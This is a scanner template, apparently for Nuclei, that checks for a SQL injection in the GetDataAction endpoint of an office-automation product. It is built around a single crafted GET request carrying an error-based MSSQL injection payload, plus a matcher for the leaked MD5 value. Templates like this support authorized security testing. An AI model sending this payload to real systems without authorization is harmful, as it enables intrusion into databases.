id: yuantianoa-GetDataAction-sqli

info:
  name: yuantianoa-GetDataAction-sqli
  author: HuanXiong
  severity: high

  tags: SQL Injection

http:
  - raw:
      - |
        GET /ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20AND%20%27a%27=%27a HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6
        Connection: close

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==500 && contains_all(body,'4ca4238a0b923820dcc509a6f75849b')"